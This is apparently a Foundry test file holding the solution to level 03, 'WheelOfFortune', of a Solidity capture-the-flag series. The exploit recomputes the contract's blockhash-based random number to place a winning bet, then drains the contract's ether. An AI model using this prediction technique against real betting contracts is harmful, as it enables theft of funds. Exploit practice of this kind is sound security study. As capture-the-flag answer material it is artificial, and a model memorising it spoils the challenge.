// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 firstBet = rand(blockhash(48743985), 100);
        instance.spin{value: 0.01 ether}(firstBet);
        instance.spin{value: 0.01 ether}(0);

        checkSuccess();
    }

    function rand(bytes32 _hash, uint256 _max) internal pure returns (uint256 result) {
        result = uint256(keccak256(abi.encode(_hash))) % _max;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
